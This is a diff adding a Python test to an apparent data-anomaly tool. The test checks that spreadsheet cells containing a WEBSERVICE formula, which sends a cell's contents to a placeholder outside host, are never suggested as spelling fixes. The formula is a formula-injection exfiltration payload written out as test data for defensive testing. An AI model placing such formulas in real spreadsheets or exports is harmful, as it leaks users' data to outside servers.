@@ -330,3 +330,12 @@ def test_review_fixes_ids_totals_names():
     df, _, _ = load_from_records(["Paid"], [[round(float(rng.lognormal(8, 1)), 2)] for _ in range(80)])
     b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Paid"])["Paid"]
     assert b_lo >= w_lo
+
+
+def test_formula_like_text_is_never_offered_as_a_spelling_fix():
+    from anomaly_hunter.load import load_from_records
+    from anomaly_hunter.pipeline import score
+    vals = ['=WEBSERVICE("https://x/?"&A1)'] * 4 + ['=webservice("https://x/?"&a1)'] + ["Ok"] * 30
+    df, types, errors = load_from_records(["Note", "N"], [[v, k] for k, v in enumerate(vals)])
+    rows, _ = score(df, types, errors, {}, None)
+    assert not any(r.get("likely") for r in rows)
